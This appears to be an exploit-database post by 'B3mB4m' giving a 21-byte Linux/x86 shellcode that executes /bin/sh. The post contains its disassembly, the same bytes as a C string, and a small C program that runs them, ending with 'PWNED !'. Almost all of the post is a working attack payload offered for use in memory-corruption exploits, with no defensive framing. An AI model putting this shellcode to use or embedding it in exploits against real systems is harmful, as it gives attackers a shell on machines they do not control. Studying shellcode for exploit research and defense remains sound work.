Linux/x86 execve /bin/sh shellcode 21 bytes


#Greetz : KnocKout,curtis,Bomberman(Leader)
#Author : B3mB4m

Disassembly of section .text:

08048060 <.text>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c2                 mov    %eax,%edx
 8048071: b0 0b                 mov    $0xb,%al
 8048073: cd 80                 int    $0x80


#include <stdio.h>
#include <string.h>

char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80";

int main(void){
  fprintf(stdout,"Length: %d\n",strlen(shellcode));
  (*(void(*)()) shellcode)();}

# Length: 21 PWNED !